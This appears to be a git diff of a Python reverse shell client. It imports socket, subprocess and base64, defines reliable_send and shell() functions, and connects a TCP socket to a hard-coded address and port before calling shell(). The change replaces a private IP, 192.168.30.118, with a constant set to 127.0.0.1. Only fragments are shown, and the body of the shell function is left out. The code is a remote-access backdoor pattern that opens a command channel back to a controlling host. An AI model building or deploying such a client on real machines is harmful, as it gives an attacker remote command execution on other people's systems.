@@ -4,6 +4,9 @@ import subprocess
 import json
 import os
 import base64
+
+IP_CONNECT = "127.0.0.1"
+
 def reliable_send(data):
 	json_data = data
 	print(json_data)
@@ -31,7 +34,7 @@ def shell():
 		
 
 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-sock.connect(("192.168.30.118",54321))
+sock.connect((IP_CONNECT,54321))
 
 shell()
 sock.close()
